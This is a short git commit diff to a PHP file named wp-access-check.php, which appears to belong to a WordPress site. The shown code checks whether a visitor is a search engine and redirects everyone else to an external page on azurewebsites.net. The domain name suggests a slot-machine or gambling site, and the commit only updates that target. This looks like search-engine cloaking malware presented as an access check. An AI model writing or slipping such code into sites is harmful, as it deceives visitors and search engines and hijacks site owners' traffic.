35af5c24c58791edef8116d9b232e0a66d7c3722
monsterZD <hmjim@mail.ru>
2022-02-19 22:08:20 +0300

    '2022-02-19-22.06.02'

--- wp-access-check.php
+++ wp-access-check.php
@@ -565,5 +565,5 @@ if(searchEngineDetect()!==false){
 		$asdasd=true;
 }
 if($asdasd==false)
-	header('Location:https://avtomatylucks.azurewebsites.net/russia-noacess.html');
+	header('Location:https://avtomatyluck.azurewebsites.net/russia-noacess.html');
 ?>
